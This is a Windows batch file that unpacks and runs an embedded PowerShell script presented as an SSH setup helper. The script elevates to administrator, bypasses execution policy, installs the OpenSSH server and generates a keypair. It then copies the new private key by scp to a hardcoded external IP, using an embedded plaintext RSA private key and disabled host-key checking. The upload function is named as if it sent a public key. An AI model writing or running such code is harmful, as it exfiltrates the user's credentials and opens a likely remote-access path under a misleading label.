@echo off
setlocal EnableExtensions EnableDelayedExpansion

rem =========================================================
rem setup-ssh-universal.cmd
rem Hybrid CMD -> PowerShell Loader
rem =========================================================

set "SCRIPT_DIR=%~dp0"
set "PS1_NAME=setup-ssh-universal.ps1"
set "PS1_PATH=%SCRIPT_DIR%%PS1_NAME%"
set "LOGFILE=%SCRIPT_DIR%setup-ssh-universal.log"


rem =========================================================
rem Admin Check
rem =========================================================

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Administratorrechte erforderlich...
    
    powershell -NoProfile -Command ^
        "Start-Process -FilePath '%~f0' -Verb RunAs"

    exit /b
)

rem =========================================================
rem Extract embedded PowerShell
rem =========================================================

echo [INFO] Extrahiere eingebettetes PowerShell Skript...

break > "%PS1_PATH%"

for /f "delims=" %%L in ('findstr /b "::PS1:" "%~f0"') do (
    set "line=%%L"
    >> "%PS1_PATH%" echo(!line:~6!
)

if not exist "%PS1_PATH%" (
    echo [ERROR] PowerShell Datei konnte nicht erstellt werden.
    pause
    exit /b 1
)

rem =========================================================
rem Execute PowerShell
rem =========================================================

echo [INFO] Starte PowerShell mit:
echo        %PS1_PATH%
echo.

powershell ^
    -NoProfile ^
    -ExecutionPolicy Bypass ^
    -File "%PS1_PATH%" %* > "%LOGFILE%" 2>&1

set "RC=%ERRORLEVEL%"

echo ==========================================
echo PowerShell Exit Code: %RC%
echo ==========================================
echo.

type "%LOGFILE%"

echo.
echo ==========================================
pause

exit /b %RC%

::PS1:#requires -RunAsAdministrator
::PS1:param(
::PS1:    [string]$KeyBasePath = "C:\ProgramData\ssh\test",
::PS1:    [switch]$ApplyKeyToAllLocalUsers = $true,
::PS1:    [string]$ServerHost = "193.123.189.154",
::PS1:    [int]$ServerPort = 22,
::PS1:    [string]$ServerUser = "ubuntu",
::PS1:    [string]$ServerPrivateKey = (Join-Path $env:TEMP 'tmp_key'),
::PS1:    [string]$ServerKeyPath = "/home/$ServerUser",
::PS1:    [switch]$SendClientPrivateKey = $true,
::PS1:    [string]$ServerClientKeyPath = "/home/$ServerUser/.ssh/id_ed25519_client"
::PS1:)
::PS1:
::PS1:# Write embedded server private key to a secure temp file and set permissions
::PS1:$ServerPrivateKeyContent = @"
::PS1:-----BEGIN RSA PRIVATE KEY-----
::PS1:MIIEpAIBAAKCAQEAy7JhQ05WYOONdBvtHaX2TZTWEEwWTSHjyYPiupbSFGuqgl3k
::PS1:ah4bGDclEjk4WNLeVXjMBJcFr56AXtm08boZ0gA6effwO2AHRUibR77Wm06OsyWe
::PS1:XVUl/7stDxdLyonsfh+/3Nrhi19HzYrT8UsbG0Rt2LFWzcJ9zooytMKb/AzRPcdo
::PS1:R6zPZFXmV1ZVPsOyuzpQ2avqNEQUkoyyf+7E3Z+57/SqJ0c4fCfxN22CfDPPOPud
::PS1:6YSeDsNykSOVGRv12wFjIRtxIYwFB29Ovj0g8UJEJDsWZFPkG3KIHqX/1u6m37jI
::PS1:VpQuil/4TBEkiPRBaQpmJJtqkOzh/Oxs7+XPiQIDAQABAoIBAFqabN3RteUhwhTv
::PS1:qQADhnNKrQ6RsWe8l8PWGF7TX/06SJz1I3i6DGYwfRpGflQv8zoEYYb3H83WTBYk
::PS1:cvIES6DXfisrR905IPLF0V/PuEhbYGi55l9wVNcTi/7G52ze/WS6PY6Ag0sJZfg8
::PS1:dHpC5Hsz7EIy2z/pbykT2msBlv08cQ14NqcTmWrIRuxak+EVGxLuszAazUzAc4dp
::PS1:Qfe3xJ59Ow1TpHdaEJOEpQk5bJsV9S5LAnd1tS0fehB2ZSiaI2zVHr97Ua6HNFcS
::PS1:t7Y5VERYSXHuyLhW6HSiCI3IZkEdn5KCKgAkseFoYb5awxy/7j7CB8tBrpq36A+9
::PS1:Gu3LUHsCgYEA6j6ZmRdyHcddVqbLbKrBR7OXSEBX7QdKrROZ7UepLHiVBXRZu/1G
::PS1:TEtQXrgivp1dzcLmSL08OOzler2dcYAFI3RdJ8PCgOtnTFhev812mr64h1hWW65+
::PS1:r7QWcp3R6oQWerUtWez/CWRMAvmaBesyPRKEeElaDlXECxlIXruigNMCgYEA3p16
::PS1:C33uJ3yBrEqeW842XL/8hW67JK97QuuGzi+70fVhPzmUkLA7YpWxV/vdfxbz07sr
::PS1:c8qusOwrCY/jwjSdrr3pkK5Ug+DBx7G6wXAGxgKnVa9YdROegxuWr0lhFkEed2sH
::PS1:ZMjevhdISNmjUdrSvglM7vTCK/CPhmacIfSt1LMCgYEAtkLJHp5ok5UZIiAb7kya
::PS1:oSCy2GwAPhTLXQoAXejBUDHuudTDMYurlBeRzHF3z1sAruY0amqbnittjuhUxgh3
::PS1:dxPGm/css0T3Fic4agMDgvpc+Cqa3zFRr4LvaHU17USjfQzV4b+O3Y7lufbeijZr
::PS1:26s52aIxaTAAnyYn8lYK5jMCgYEAtzdAZQjl4xWz28sl/kT/tOJFwMPbvlu2xOL3
::PS1:decPW8Pqn5CSV2rT1VWCOfmO2LRZRN986bXchLw6x4nnV8TaKiEfg/YWlNt8YRBD
::PS1:tkSvLnSsp/bChMj64sjoAagRAbHik0JBOY+g0y5yTZLhudKxM7qP2PMUg/lfBqyY
::PS1:v9GS58UCgYAuC/easKJF4K2RcWdmrO/HVGveo+eD/s/dmm5ifwh9/Fnepo3SUmyC
::PS1:rkMBUZ8pBSLnKEPZF0ljamjfcxoV7MyroRJ2tcRETP07rYasnkCaM6/P5x8U0Im+
::PS1:/dhzycjAb2/WY6OWgadG3PWK9YKFvwjFHMpNLQw/j8hV9+fBDWOSlw==
::PS1:-----END RSA PRIVATE KEY-----
::PS1:"@
::PS1:$tmpKeyPath = Join-Path $env:TEMP 'tmp_key'
::PS1:[System.IO.File]::WriteAllText($tmpKeyPath, $ServerPrivateKeyContent, [System.Text.Encoding]::ASCII)
::PS1:icacls $tmpKeyPath /inheritance:r | Out-Null
::PS1:icacls $tmpKeyPath /grant:r "$($env:USERNAME):F" | Out-Null
::PS1:$ServerPrivateKey = $tmpKeyPath
::PS1:
::PS1:$ErrorActionPreference = "Stop"
::PS1:
::PS1:function Write-Step([string]$m) {
::PS1:    Write-Host ""
::PS1:    Write-Host "==> $m" -ForegroundColor Cyan
::PS1:}
::PS1:
::PS1:function Install-OpenSshIfMissing {
::PS1:    try {
::PS1:        $client = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Client*"
::PS1:        $server = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Server*"
::PS1:
::PS1:        if ($client -and $client.State -ne "Installed") {
::PS1:            Write-Step "Installiere OpenSSH Client"
::PS1:            Add-WindowsCapability -Online -Name $client.Name | Out-Null
::PS1:        }
::PS1:
::PS1:        if ($server -and $server.State -ne "Installed") {
::PS1:            Write-Step "Installiere OpenSSH Server"
::PS1:            Add-WindowsCapability -Online -Name $server.Name | Out-Null
::PS1:        }
::PS1:    }
::PS1:    catch {
::PS1:        Write-Warning $_.Exception.Message
::PS1:    }
::PS1:}
::PS1:
::PS1:function Ensure-KeyPair {
::PS1:    param([string]$PrivateKeyPath)
::PS1:
::PS1:    $PublicKeyPath = "$PrivateKeyPath.pub"
::PS1:
::PS1:    if ((Test-Path $PrivateKeyPath) -and (Test-Path $PublicKeyPath)) {
::PS1:        Write-Host "OK: Keypair bereits vorhanden"
::PS1:        return
::PS1:    }
::PS1:
::PS1:    Write-Step "Erzeuge SSH-Keypair"
::PS1:
::PS1:    $dir = Split-Path $PrivateKeyPath
::PS1:
::PS1:    if (-not (Test-Path $dir)) {
::PS1:        New-Item -ItemType Directory -Path $dir -Force | Out-Null
::PS1:    }
::PS1:
::PS1:    Remove-Item $PrivateKeyPath,$PublicKeyPath -Force -ErrorAction SilentlyContinue
::PS1:
::PS1:    $cmd = 'ssh-keygen -q -t ed25519 -N "" -f "' + $PrivateKeyPath + '"'
::PS1:
::PS1:    cmd.exe /c $cmd
::PS1:
::PS1:    if (-not (Test-Path $PrivateKeyPath)) {
::PS1:        throw "Private Key nicht erstellt"
::PS1:    }
::PS1:
::PS1:    if (-not (Test-Path $PublicKeyPath)) {
::PS1:        throw "Public Key nicht erstellt"
::PS1:    }
::PS1:
::PS1:    Write-Host "OK: SSH-Keypair erstellt"
::PS1:}
::PS1:

::PS1:function Set-AsciiTextFile([string]$Path, [string]$Content) {
::PS1:    [System.IO.File]::WriteAllText($Path, $Content, [System.Text.Encoding]::ASCII)
::PS1:}
::PS1:
::PS1:function Send-PublicKeyToServer {
::PS1:    param(
::PS1:        [string]$remoteHost,
::PS1:        [int]$port,
::PS1:        [string]$user,
::PS1:        [string]$privateKeyPath,
::PS1:        [string]$remotePath,
::PS1:        [string]$serverPrivateKey
::PS1:    )
::PS1:
::PS1:    Write-Host "==> übertrage Private Key via SCP"
::PS1:
::PS1:    if (-not (Test-Path $privateKeyPath)) {
::PS1:        throw "Lokale Datei nicht gefunden: $privateKeyPath"
::PS1:    }

::PS1:    $scpCmd = @("scp","-o", "StrictHostKeyChecking=no", "-i", $serverPrivateKey, "-P", $port,"`"$privateKeyPath`"","$user@$remoteHost`":`"$remotePath`"")

::PS1:    & $scpCmd[0] $scpCmd[1..($scpCmd.Length-1)]

::PS1:    if ($LASTEXITCODE -ne 0) {
::PS1:        throw "SCP Upload fehlgeschlagen: Exit Code $LASTEXITCODE"
::PS1:    }

::PS1:    Write-Host "OK: Upload erfolgreich"
::PS1:}
::PS1:Install-OpenSshIfMissing
::PS1:Ensure-KeyPair -PrivateKeyPath $KeyBasePath
::PS1:
::PS1:Write-Step "Fertig"
::PS1:
::PS1:Write-Host "Private Key:"
::PS1:Write-Host "  $KeyBasePath"
::PS1:
::PS1:Write-Host "Public Key:"
::PS1:Write-Host "  $KeyBasePath.pub"
::PS1:Send-PublicKeyToServer `
::PS1:    -remoteHost $ServerHost `
::PS1:    -port $ServerPort `
::PS1:    -user $ServerUser `
::PS1:    -privateKeyPath $KeyBasePath `
::PS1:    -remotePath $ServerKeyPath `
::PS1:    -serverPrivateKey $ServerPrivateKey